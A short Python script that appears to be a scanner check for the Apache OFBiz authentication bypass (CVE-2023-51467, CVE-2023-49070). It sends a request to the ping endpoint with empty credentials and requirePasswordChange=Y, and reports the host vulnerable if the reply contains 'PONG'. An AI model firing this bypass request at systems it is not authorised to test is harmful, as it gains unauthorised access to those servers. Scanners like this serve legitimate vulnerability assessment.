import requests
import logging


# CVE-2023-51467 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51467
# CVE-2023-49070 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49070

def apache_ofbiz(url: str, verify: bool = True, timeout: int | float = 10) -> bool:
    try:
        target = url + "/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y"
        response = requests.get(target, verify=verify, timeout=timeout)
        
        if "PONG" in response.text:
            return True
        
        else:
            return False
        
    except Exception as e:
        logging.error(e)